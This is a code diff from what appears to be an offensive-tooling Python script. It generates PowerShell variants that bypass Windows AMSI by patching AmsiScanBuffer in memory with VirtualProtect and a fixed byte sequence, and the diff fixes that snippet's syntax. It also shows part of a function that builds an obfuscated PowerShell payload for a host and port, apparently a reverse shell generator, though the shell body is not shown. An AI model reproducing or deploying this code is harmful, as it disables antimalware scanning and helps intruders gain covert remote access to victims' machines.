@@ -54,10 +54,11 @@ def amsi_bypass_variants(var):
         '"@\n'
         'Add-Type -TypeDefinition $code\n'
         '$a = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")\n'
-        '[Win32]::VirtualProtect($a, [System.UIntPtr]::op_Explicit(5), 0x40, [ref]0) | Out-Null'
-        '[Byte[]]$p = 0xB8,0x57,0x00,0x07,0x80\n'
+        '[Win32]::VirtualProtect($a, [System.UIntPtr]::op_Explicit(5), 0x40, [ref]0) | Out-Null\n'
+        '$p = [Byte[]](0xB8,0x57,0x00,0x07,0x80)\n'
         '[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)\n'
     )
+
     return [variant1, variant2, variant3]
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
@@ -85,6 +86,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         "}\n"
         + junk_code()
     )
+
 
 
     print("=== CORE SHELL ===")
